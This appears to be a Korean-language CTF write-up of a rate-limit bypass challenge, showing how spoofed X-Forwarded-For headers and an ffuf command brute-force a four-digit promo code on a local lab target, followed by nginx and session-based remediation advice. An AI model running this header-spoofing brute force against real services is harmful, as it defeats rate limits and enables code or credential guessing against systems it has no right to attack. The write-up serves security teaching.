+++
title = "VulnABLE CTF [LUXORA] Write-up: Rate Limit Bypass 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Rate Limit", "Bronze", "Header Spoofing", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Rate Limit Bypass 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Logic & Business Layer (Rate Limit Bypass)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/ratelimit/bronze`
- **목표**: 1분에 5번만 시도할 수 있도록 제한(Rate Limit)이 걸린 프로모션 코드 입력 창에서, 클라이언트 IP 식별 헤더를 변조(Spoofing)하여 제한을 우회하고 수천 개의 코드를 무차별 대입(Brute Force)하여 숨겨진 코드를 찾아라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/ratelimit/bronze` 페이지에서 아무 프로모션 코드나 6번 연속으로 입력해 봅니다.

**[정상 실패 시도 (6번째)]**
```http
POST /ratelimit/bronze/apply HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=TEST1234
```

**[서버의 응답]**
```json
{
  "error": "Rate limit exceeded. Try again in 60 seconds."
}
```

**[해커의 사고 과정]**
1. 이전에 Brute Force 챌린지에서 했던 것과 완벽히 동일한 상황이다. 서버가 나의 "요청 횟수"를 카운트하고 있다.
2. 서버는 내가 누군지 어떻게 알까? 로그인 안 한 상태라면 십중팔구 내 **IP 주소**를 기준으로 카운트할 것이다.
3. 내 IP 주소를 식별할 때, Nginx 같은 리버스 프록시 뒤에 있는 백엔드(Node.js 등)라면 `X-Forwarded-For` 나 `X-Real-IP` 헤더를 읽어서 판단할 것이다.
4. 만약 내가 이 헤더를 매번 랜덤하게 바꿔서(Spoofing) 전송한다면? 서버는 매번 "새로운 사람이네!" 라고 착각하고 카운터를 0부터 다시 시작할 것이다!

---

## 💥 2. 취약점 식별 및 FFuF 페이로드 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(IP 1)--> [ Server ]
[ Attacker ] --(IP 2)--> [ Server ]
[ Attacker ] --(IP 3)--> [ Server ]
                         |-- Rate Limit Bypassed by IP Rotation
```


이 취약점은 서버가 클라이언트의 실제 IP(TCP 소켓 통신의 주소)가 아닌, 클라이언트가 임의로 조작할 수 있는 **HTTP 헤더(X-Forwarded-For)**를 전적으로 신뢰할 때 발생합니다.

### 💡 FFuF 브루트포싱 설계
Brute Force 챌린지에서 사용했던 IP 로테이션 스크립트와 FFuF 도구를 그대로 다시 사용합니다.
목표는 4자리 숫자(0000~9999) 형태의 프로모션 코드를 알아내는 것입니다.

1. **가짜 IP 리스트 준비 (`ips.txt`)**
   ```bash
   for i in {1..10000}; do echo "$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))" >> ips.txt; done
   ```
2. **숫자 단어장 준비 (`numbers.txt`)**
   ```bash
   seq -w 0000 9999 > numbers.txt
   ```

---

## 🚀 3. 공격 수행 및 결과 확인

FFuF를 이용하여 프로모션 코드(`W1`)와 가짜 IP(`W2`)를 동시에 돌립니다.

```bash
# FFuF 듀얼 워드리스트 실행
$ ffuf -w numbers.txt:W1 -w ips.txt:W2 \
       -u http://localhost:3000/ratelimit/bronze/apply \
       -X POST \
       -H "X-Forwarded-For: W2" \
       -d "code=W1" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -mr "Success" # "Success" 라는 단어가 응답에 있으면 매칭(Match)
```

### 🔍 서버 내부의 동작
서버는 10,000번의 POST 요청을 받지만, 각 요청의 `X-Forwarded-For` 헤더가 모두 다르기 때문에 Rate Limit 필터는 한 번도 발동하지 않습니다.

### 🔍 공격 결과
잠시 후 FFuF 화면에 매칭된 결과가 하나 출력됩니다.

```text
[Status: 200, Size: 105, Words: 12, Lines: 4, Duration: 25ms]
* W1: 7392
* W2: 192.0.2.44
```

정확한 프로모션 코드는 `7392` 였습니다!

이 코드를 브라우저에 입력하면 챌린지 클리어와 함께 플래그가 반환됩니다.
`FLAG{RATELIMIT_🥉_XFF_SPOOFING_A1B2C3}`

---

## 🚩 4. 롸잇업 결론 및 플래그

Rate Limiting 시스템의 근간이 되는 '사용자 식별' 기준을 클라이언트가 통제할 수 있는 값(Header)으로 설정했을 때, 이 방어막이 얼마나 무력하게 뚫리는지 재확인했습니다.

**🔥 획득한 플래그:**
`FLAG{RATELIMIT_🥉_XFF_SPOOFING_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자 식별은 결코 클라이언트가 보내는 평문 HTTP 헤더에 의존해서는 안 됩니다.

* **안전한 패치 가이드 (인프라 레벨의 IP 식별)**
1. **리버스 프록시(Nginx 등) 단에서 헤더 덮어쓰기**: 
   외부에서 들어오는 모든 `X-Forwarded-For` 값은 무시(Drop)하고, Nginx가 TCP 소켓 연결을 맺은 진짜 클라이언트의 IP(`$remote_addr`)로 해당 헤더를 덮어씌워 백엔드로 넘겨야 합니다.
   ```nginx
   # Nginx 설정
   proxy_set_header X-Forwarded-For $remote_addr;
   ```
2. **다중 조건 Rate Limiting**: 
   IP뿐만 아니라 유저의 세션(Session ID)이나 디바이스 핑거프린트 등을 조합하여, IP가 바뀌더라도 동일한 유저/세션의 요청이라면 차단하도록 정책을 고도화(Token Bucket, Leaky Bucket 등)해야 합니다.